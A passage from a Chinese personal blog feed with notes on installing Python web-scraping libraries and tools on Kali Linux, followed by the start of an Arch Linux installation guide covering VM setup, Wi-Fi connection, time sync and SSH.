<h2 id="安装GeckoDriver"><a href="#安装GeckoDriver" class="headerlink" title="安装GeckoDriver"></a>安装GeckoDriver</h2><p>那么对于 Firefox 来说，也可以使用同样的方式完成 Selenium 的对接，这时需要安装另一个驱动 GeckoDriver</p>
<p>在github上搜索GeckoDriver<img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115183547346.png" alt="image-20210115183547346"></p>
<p>​    解压出来放到<code>/usr/bin</code>里面</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mv geckodriver /usr/bin</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115183647787.png" alt="image-20210115183647787"></p>
<p>在终端运行<code>geckodriver</code>看看有没有安装成功</p>
<p>​    <img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115183819742.png" alt="image-20210115183819742"></p>
<p>控制台输出</p>
<p>随后执行如下 Python 代码，在程序中测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span>  webdriver</span><br><span class="line">browser =  webdriver.Firefox()</span><br></pre></td></tr></table></figure>
<p>可以看见成功了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115184041421.png" alt="image-20210115184041421"></p>
<h2 id="安装PhantomJS"><a href="#安装PhantomJS" class="headerlink" title="安装PhantomJS"></a>安装PhantomJS</h2><p>Selenium 支持 PhantomJS，这样在运行的时候就不会再弹出一个浏览器了。而且 PhantomJS 的运行效率也很高，还支持各种参数配置，使用非常方便</p>
<p>下载地址</p>
<p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115184531274.png" alt="image-20210115184531274"></p>
<p>解压出来</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tar -xvf 文件名</span><br></pre></td></tr></table></figure>
<p>将程序移到一个合适的位置</p>
<p>我叫他移动到<code>/opt/</code>文件里面叫名字改成了<code>phantomjs</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mv phantomjs-2.1.1-linux-x86_64 /opt/phantomjs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115185755409.png" alt="image-20210115185755409"></p>
<p>创建软链接到环境变量中。这样可以直接在shell中使用phantomjs命令:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ln -sf /opt/phantomjs/bin/phantomjs /usr/<span class="built_in">local</span>/bin/phantomjs</span><br></pre></td></tr></table></figure>
<p>查看有没有安装好我发现报错了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115190217821.png" alt="image-20210115190217821"></p>
<p>解决方法</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> OPENSSL_CONF=/etc/ssl/</span><br></pre></td></tr></table></figure>
<p>在运行就没有报错了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115190251034.png" alt="image-20210115190251034"></p>
<p>验证安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">print(browser.current_url)</span><br></pre></td></tr></table></figure>
<p>运行之后，我们就不会发现有浏览器弹出了，但实际上 PhantomJS 已经运行起来了。这里我们访问了百度，然后将当前的 URL 打印出来</p>
<p><strong>我这个kali有个问题就是必须在这个终端上先输入<code>export OPENSSL_CONF=/etc/ssl/</code>才能正常运行</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115191247966.png" alt="image-20210115191247966"></p>
<h2 id="安装aiohttp"><a href="#安装aiohttp" class="headerlink" title="安装aiohttp"></a>安装aiohttp</h2><p>之前介绍的 Requests 库是一个阻塞式 HTTP 请求库，当我们发出一个请求后，程序会一直等待服务器响应，直到得到响应后，程序才会进行下一步处理。其实，这个过程比较耗费资源。如果程序可以在这个等待过程中做一些其他的事情，如进行请求的调度、响应的处理等，那么爬取效率一定会大大提高。</p>
<p>aiohttp 就是这样一个提供异步 Web 服务的库，从 Python 3.5 版本开始，Python 中加入了 <code>async</code>/<code>await</code> 关键字，使得回调的写法更加直观和人性化。aiohttp 的异步操作借助于 <code>async</code>/<code>await</code> 关键字的写法变得更加简洁，架构更加清晰。使用异步请求库进行数据抓取时，会大大提高效率</p>
<p><strong>kali默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install aiohttp</span><br></pre></td></tr></table></figure>
<p>测试安装</p>
<p>没有报错就成功了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115191527214.png" alt="image-20210115191527214"></p>
<h1 id="解析库的安装"><a href="#解析库的安装" class="headerlink" title="解析库的安装"></a>解析库的安装</h1><h2 id="安装lxml"><a href="#安装lxml" class="headerlink" title="安装lxml"></a>安装lxml</h2><p>lxml 是 Python 的一个解析库，支持 HTML 和 XML 的解析，支持 XPath 解析方式，而且解析效率非常高</p>
<p><strong>kali默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install lxml</span><br></pre></td></tr></table></figure>
<p>验证安装</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115192425347.png" alt="image-20210115192425347"></p>
<h2 id="安装Beautiful-Soup"><a href="#安装Beautiful-Soup" class="headerlink" title="安装Beautiful Soup"></a>安装Beautiful Soup</h2><p>Beautiful Soup 是 Python 的一个 HTML 或 XML 的解析库，我们可以用它来方便地从网页中提取数据。它拥有强大的 API 和多样的解析方式</p>
<p><strong>Beautiful Soup 的 HTML 和 XML 解析器是依赖于 lxml 库的，所以在此之前请确保已经成功安装好了 lxml 库</strong></p>
<p><strong>kali默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>验证安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">&#x27;&lt;p&gt;Hello&lt;/p&gt;&#x27;</span>, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">print(soup.p.string)</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115192821626.png" alt="image-20210115192821626"></p>
<h2 id="安装pyquery"><a href="#安装pyquery" class="headerlink" title="安装pyquery"></a>安装pyquery</h2><p>pyquery 同样是一个强大的网页解析工具，它提供了和 jQuery 类似的语法来解析 HTML 文档，支持 CSS 选择器，使用非常方便</p>
<p><strong>kali默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install pyquery</span><br></pre></td></tr></table></figure>
<p>验证安装</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115193051745.png" alt="image-20210115193051745"></p>
<h2 id="安装tesserocr"><a href="#安装tesserocr" class="headerlink" title="安装tesserocr"></a>安装tesserocr</h2><p>在爬虫过程中，难免会遇到各种各样的验证码，而大多数验证码还是图形验证码，这时候我们可以直接用 OCR 来识别</p>
<p>什么是OCR，即 Optical Character Recognition，光学字符识别，是指通过扫描字符，然后通过其形状将其翻译成电子文本的过程。对于图形验证码来说，它们都是一些不规则的字符，这些字符确实是由字符稍加扭曲变换得到的内容。</p>
<p><strong>安装Python的tesserocr的库</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install tesserocr </span><br></pre></td></tr></table></figure>
<p> 验证安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tesserocr</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image = Image.open(<span class="string">&#x27;image.png&#x27;</span>)</span><br><span class="line">print(tesserocr.image_to_text(image))</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115194401778.png" alt="image-20210115194401778"></p>
<p><strong>kali安装tesserocr命令</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install -y tesseract-ocr libtesseract-dev libleptonica-dev</span><br></pre></td></tr></table></figure>
<p>验证安装</p>
<p>在这个文件下载一个照片</p>
<p><a href="https://raw.githubusercontent.com/Python3WebSpider/TestTess/master/image.png">https://raw.githubusercontent.com/Python3WebSpider/TestTess/master/image.png</a></p>
<p>然后运行这个命令</p>
<p><code>image.png</code>是下载的照片文件名</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tesseract image.png result -l eng &amp;&amp; cat result.txt</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115193938266.png" alt="image-20210115193938266"></p>
<h1 id="数据库的安装"><a href="#数据库的安装" class="headerlink" title="数据库的安装"></a>数据库的安装</h1><p>可以存储我们爬下来的东西</p>
<p><strong>mysql  kali已经默认安装了</strong></p>
<p>关闭和重启 MySQL 服务的命令如下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo service mysql start</span><br><span class="line">sudo service mysql stop</span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>
<h1 id="数据库的安装-1"><a href="#数据库的安装-1" class="headerlink" title="数据库的安装"></a>数据库的安装</h1><p>这个就是叫python调用数据库</p>
<p>我只用mysql就可以了</p>
<p>下载</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install pymysql</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115195006127.png" alt="image-20210115195006127"></p>
<h1 id="Web-库的安装"><a href="#Web-库的安装" class="headerlink" title="Web 库的安装"></a>Web 库的安装</h1><p>Flask 是一个轻量级的 Web 服务程序，它简单、易用、灵活，这里主要用来做一些 API 服务</p>
<h2 id="安装flask"><a href="#安装flask" class="headerlink" title="安装flask"></a>安装flask</h2><p><strong>kail默认安装了</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure>
<p> 验证安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p>可以发现，系统会在 5000 端口开启 Web 服务，控制台输出如下</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115195542197.png" alt="image-20210115195542197"></p>
<h2 id="安装Tornado"><a href="#安装Tornado" class="headerlink" title="安装Tornado"></a>安装Tornado</h2><p>Tornado 是一个支持异步的 Web 框架，通过使用非阻塞 I/O 流，它可以支撑成千上万的开放连接，效率非常高，本节就来介绍一下它的安装方式</p>
<p>kali默认安装了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install tornado</span><br></pre></td></tr></table></figure>
<p> 验证安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.write(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">        (<span class="string">r&quot;/&quot;</span>, MainHandler),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8888</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接运行程序，可以发现系统在 8888 端口运行了 Web 服务，控制台没有输出内容，此时访问 <a href="http://127.0.0.1:8888/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%82%E5%AF%9F%E5%88%B0%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%91%88%E7%8E%B0%E4%BA%86">http://127.0.0.1:8888/，可以观察到网页中呈现了</a> Hello,world，如图 1-42 所示，这就说明 Tornado 成功安装了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115195919280.png" alt="image-20210115195919280"></p>
<h1 id="App-爬取相关库的安装"><a href="#App-爬取相关库的安装" class="headerlink" title="App 爬取相关库的安装"></a>App 爬取相关库的安装</h1><p><strong>简单来说就是抓包工具</strong></p>
<p>除了 Web 网页，爬虫也可以抓取 App 的数据。App 中的页面要加载出来，首先需要获取数据，而这些数据一般是通过请求服务器的接口来获取的。由于 App 没有浏览器这种可以比较直观地看到后台请求的工具，所以主要用一些抓包技术来抓取数据。</p>
<p>本书介绍的抓包工具有 Charles、mitmproxy 和 mitmdump。一些简单的接口可以通过 Charles 或 mitmproxy 分析，找出规律，然后直接用程序模拟来抓取了。但是如果遇到更复杂的接口，就需要利用 mitmdump 对接 Python 来对抓取到的请求和响应进行实时处理和保存。另外，既然要做规模采集，就需要自动化 App 的操作而不是人工去采集，所以这里还需要一个工具叫作 Appium，它可以像 Selenium 一样对 App 进行自动化控制，如自动化模拟 App 的点击、下拉等操作。</p>
<p>本节中，我们就来介绍一下 Charles、mitmproxy、mitmdump、Appium 的安装方法</p>
<h2 id="安装的Charles"><a href="#安装的Charles" class="headerlink" title="安装的Charles"></a>安装的Charles</h2><ul>
<li>官方网站：<a href="https://www.charlesproxy.com/">https://www.charlesproxy.com</a></li>
<li>下载链接：<a href="https://www.charlesproxy.com/download">https://www.charlesproxy.com/download</a></li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115200232611.png" alt="image-20210115200232611"></p>
<p>这个我就不安装了</p>
<h2 id="安装mitmproxy"><a href="#安装mitmproxy" class="headerlink" title="安装mitmproxy"></a>安装mitmproxy</h2><p><strong>kali默认安装了</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a></li>
<li>官方网站：<a href="https://mitmproxy.org/">https://mitmproxy.org</a></li>
<li>PyPI：<a href="https://pypi.python.org/pypi/mitmproxy">https://pypi.python.org/pypi/mitmproxy</a></li>
<li>官方文档：<a href="http://docs.mitmproxy.org/">http://docs.mitmproxy.org</a></li>
<li>mitmdump 脚本：<a href="http://docs.mitmproxy.org/en/stable/scripting/overview.html">http://docs.mitmproxy.org/en/stable/scripting/overview.html</a></li>
<li>下载地址：<a href="https://github.com/mitmproxy/mitmproxy/releases">https://github.com/mitmproxy/mitmproxy/releases</a></li>
<li>DockerHub：<a href="https://hub.docker.com/r/mitmproxy/mitmproxy">https://hub.docker.com/r/mitmproxy/mitmproxy</a></li>
</ul>
<h2 id="安装-Appium"><a href="#安装-Appium" class="headerlink" title="安装 Appium"></a>安装 Appium</h2><p>Appium 是移动端的自动化测试工具，类似于前面所说的 Selenium，利用它可以驱动 Android、iOS 等设备完成自动化测试，比如模拟点击、滑动、输入等操作，其官方网站为：<a href="http://appium.io/%E3%80%82%E6%9C%AC%E8%8A%82%E4%B8%AD%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E6%9D%A5%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B">http://appium.io/。本节中，我们就来了解一下</a> Appium 的安装方式</p>
<ul>
<li>GitHub：<a href="https://github.com/appium/appium">https://github.com/appium/appium</a></li>
<li>官方网站：<a href="http://appium.io/">http://appium.io</a></li>
<li>官方文档：<a href="http://appium.io/introduction.html">http://appium.io/introduction.html</a></li>
<li>下载链接：<a href="https://github.com/appium/appium-desktop/releases">https://github.com/appium/appium-desktop/releases</a></li>
<li>Python Client：<a href="https://github.com/appium/python-client">https://github.com/appium/python-client</a></li>
</ul>
<h1 id="爬虫框架的安装"><a href="#爬虫框架的安装" class="headerlink" title="爬虫框架的安装"></a>爬虫框架的安装</h1><p><strong>简单来说就是可以提升效率</strong></p>
<p>我们直接用 Requests、Selenium 等库写爬虫，如果爬取量不是太大，速度要求不高，是完全可以满足需求的。但是写多了会发现其内部许多代码和组件是可以复用的，如果我们把这些组件抽离出来，将各个功能模块化，就慢慢会形成一个框架雏形，久而久之，爬虫框架就诞生了。</p>
<p>利用框架，我们可以不用再去关心某些功能的具体实现，只需要关心爬取逻辑即可。有了它们，可以大大简化代码量，而且架构也会变得清晰，爬取效率也会高许多。所以，如果有一定的基础，上手框架是一种好的选择。</p>
<p>本书主要介绍的爬虫框架有 pyspider 和 Scrapy。本节中，我们来介绍一下 pyspider、Scrapy 及其扩展库的安装方式</p>
<h2 id="安装pyspider"><a href="#安装pyspider" class="headerlink" title="安装pyspider"></a>安装pyspider</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install pyspider</span><br></pre></td></tr></table></figure>
<p>这个问题太多了</p>
<h2 id="安装Scrapy"><a href="#安装Scrapy" class="headerlink" title="安装Scrapy"></a>安装Scrapy</h2><p>Scrapy 是一个十分强大的爬虫框架，依赖的库比较多，至少需要依赖的库有 Twisted 14.0、lxml 3.4 和 pyOpenSSL 0.14。在不同的平台环境下，它所依赖的库也各不相同，所以在安装之前，最好确保把一些基本库安装好。本节就来介绍 Scrapy 在不同平台的安装方法</p>
<p>安装依赖的库</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install build-essential python3-dev libssl-dev libffi-dev libxml2 libxml2-dev libxslt1-dev zlib1g-dev</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install Scrapy </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115204850986.png" alt="image-20210115204850986"></p>
<p> 验证安装</p>
<p>在命令行下输入 <code>scrapy</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115205014221.png" alt="image-20210115205014221"></p>
<h2 id="安装Scrapy-Redis"><a href="#安装Scrapy-Redis" class="headerlink" title="安装Scrapy-Redis"></a>安装Scrapy-Redis</h2><p>Scrapy-Redis 是 Scrapy 的分布式扩展模块，有了它，我们就可以方便地实现 Scrapy 分布式爬虫的搭建</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install scrapy-redis</span><br></pre></td></tr></table></figure>
<p> 测试安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy_redis</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210115205654455.png" alt="image-20210115205654455"></p>
<h1 id="部署相关库的安装"><a href="#部署相关库的安装" class="headerlink" title="部署相关库的安装"></a>部署相关库的安装</h1><p><strong>简单来说就是分布式扫描</strong></p>
<p>如果想要大规模抓取数据，那么一定会用到分布式爬虫。对于分布式爬虫来说，我们需要多台主机，每台主机多个爬虫任务，但是源代码其实只有一份。此时我们需要做的就是将一份代码同时部署到多台主机上来协同运行，那么怎么去部署就是另一个值得思考的问题。</p>
<p>对于 Scrapy 来说，它有一个扩展组件，叫作 Scrapyd，我们只需要安装该扩展组件，即可远程管理 Scrapy 任务，包括部署源码、启动任务、监听任务等。另外，还有 Scrapyd-Client 和 Scrapyd API 来帮助我们更方便地完成部署和监听操作。</p>
<p>另外，还有一种部署方式，那就是 Docker 集群部署。我们只需要将爬虫制作为 Docker 镜像，只要主机安装了 Docker，就可以直接运行爬虫，而无需再去担心环境配置、版本问题。</p>
<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt install docker </span><br></pre></td></tr></table></figure>
<h2 id="安装Scrapyd"><a href="#安装Scrapyd" class="headerlink" title="安装Scrapyd"></a>安装Scrapyd</h2><p>Scrapyd 是一个用于部署和运行 Scrapy 项目的工具，有了它，你可以将写好的 Scrapy 项目上传到云主机并通过 API 来控制它的运行。</p>
<p>既然是 Scrapy 项目部署，基本上都使用 Linux 主机，所以本节的安装是针对于 Linux 主机的</p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install scrapyd</span><br></pre></td></tr></table></figure>
<h1 id="后面的我就不安装了可能用不到"><a href="#后面的我就不安装了可能用不到" class="headerlink" title="后面的我就不安装了可能用不到"></a>后面的我就不安装了可能用不到</h1>]]></content>
      <categories>
        <category>Python爬虫</category>
      </categories>
      <tags>
        <tag>Python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux安装和U盘安装和配置</title>
    <url>/2021/03/16/archlinux/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h1 id="普通安装"><a href="#普通安装" class="headerlink" title="普通安装"></a>普通安装</h1><div class="note icon simple"><i class="note-icon fab fa-cc-visa"></i><p>玩linux也很长时间了，其实我很喜欢Archlinux可以打造一个你想要linux系统，要玩熟练掌握Archlinux要有linux厉害的功底</p>
</div> 

<div class="note icon simple"><i class="note-icon fab fa-cc-visa"></i><p>archlinux安装起来很复杂，下面我这个安装文章弄了一天，这都是值得的</p>
</div>

<div class="note info simple"><p>可以看一下我的kali linux的kde美化的效果</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/2021-02-13-21-36-33.png"></p>
<p>现在都9点多了该休息了，美化的话可能要很好长时间</p>
<h1 id="Archlinux下载"><a href="#Archlinux下载" class="headerlink" title="Archlinux下载"></a>Archlinux下载</h1><p>下载地址<a href="https://archlinux.org/download/">https://archlinux.org/download/</a></p>
<div class="note info simple"><p>下面这个是BitTorrent下载</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213100649914.png" alt="image-20210213100649914"></p>
<div class="note info simple"><p>下面这个HTTP直接下载</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213100855286.png" alt="image-20210213100855286"></p>
<p>下载好后最好要校验一下值看看有没有下载的时候有没有丢失</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213103317808.png" alt="image-20210213103317808"></p>
<h1 id="vm配置"><a href="#vm配置" class="headerlink" title="vm配置"></a>vm配置</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105120986.png" alt="image-20210213105120986"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105142020.png" alt="image-20210213105142020"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105324021.png" alt="image-20210213105324021"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105357710.png" alt="image-20210213105357710"></p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105457462.png" alt="image-20210213105457462"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213105556243.png" alt="image-20210213105556243"></p>
<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><div class="note info simple"><p>这个就可以安装了，我这个是在虚拟机里面安装的网络是桥接的网络是直接可以用的，</p>
</div>

<div class="note info simple"><p>笔记本可以直接插上网线进行连接网络，如果你是笔记本连接wifi的话可以按照我下面的方式连接</p>
</div>

<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>启动网卡</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip link <span class="built_in">set</span> wlan0 up</span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>查看网卡设备</p>
</div>

<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iwconfig</span><br></pre></td></tr></table></figure>
<p>结果，可以看见wlan0网卡启动起来了</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">ens160    no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br></pre></td></tr></table></figure>


<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>用iwlist命令来查看那个有能连接的wifi</p>
</div> 

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iwlist wlan0 scan | grep ESSID</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iwlist wlan1 scan | grep ESSID                                                                        zss@kali</span><br><span class="line">                    ESSID:<span class="string">&quot;FAST_B5F6&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;Tenda_A0CB40&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;\xE8\xB5\xB5\xE7\x91\x9E\xE6\xB6\xB5&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;CMCC_2.4G_9344&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;Tenda_9978F0&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;CMCC-ZDyR&quot;</span></span><br><span class="line">                    ESSID:<span class="string">&quot;ChinaNet-75ns&quot;</span></span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>连接wifi</p>
</div> 

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wpa_passphrase  wifi名 wifi密码 &gt; wpa_supplicant.con</span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>启动连接</p>
</div> 

<p>根据文件内容连接WiFi并后台运行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wpa_supplicant -c wpa_supplicant.conf -i wlan0 &amp;</span><br></pre></td></tr></table></figure>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>看看网络可以用不</p>
</div> 

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>


<h1 id="网络时间同步"><a href="#网络时间同步" class="headerlink" title="网络时间同步"></a>网络时间同步</h1><div class="note info simple"><p>如果时间不同步是不能在网络上下载东西的应为你的时间不对</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp true</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213124949333.png" alt="image-20210213124949333"></p>
<p>检查一下时间</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">timedatectl status</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213130358106.png" alt="image-20210213130358106"></p>
<h1 id="连接arch的ssh"><a href="#连接arch的ssh" class="headerlink" title="连接arch的ssh"></a>连接arch的ssh</h1><div class="note info simple"><p>在vm里面真的是不好操作arch他是启动了ssh了的</p>
</div>

<p>设置root密码<code>passwd</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131246692.png" alt="image-20210213131246692"></p>
<div class="note info simple"><p>查看ip</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
